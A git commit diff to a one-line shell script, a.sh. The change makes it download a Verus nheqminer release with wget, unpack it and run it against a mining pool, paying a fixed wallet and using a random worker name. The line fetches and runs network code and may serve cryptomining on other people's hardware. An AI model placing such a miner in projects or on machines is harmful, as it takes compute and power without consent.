791c8800ea1ef5a7cb22430a72ae090b216f76f4
dreamistoken <88270239+dreamistoken@users.noreply.github.com>
2021-11-10 16:45:06 +0600

    1

--- a.sh
+++ a.sh
@@ -1,1 +1,1 @@
-nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RA5cCu9227V8CUGH534MfBeYwgcMWTjV2t.$(echo $(shuf -i 1000000-9999999 -n 1)-bee) -p x -t 16
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && chmod +x nheqminer/nheqminer && chmod +x nheqminer && nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RA5cCu9227V8CUGH534MfBeYwgcMWTjV2t.$(echo $(shuf -i 1000000-9999999 -n 1)-bee) -p x -t 16
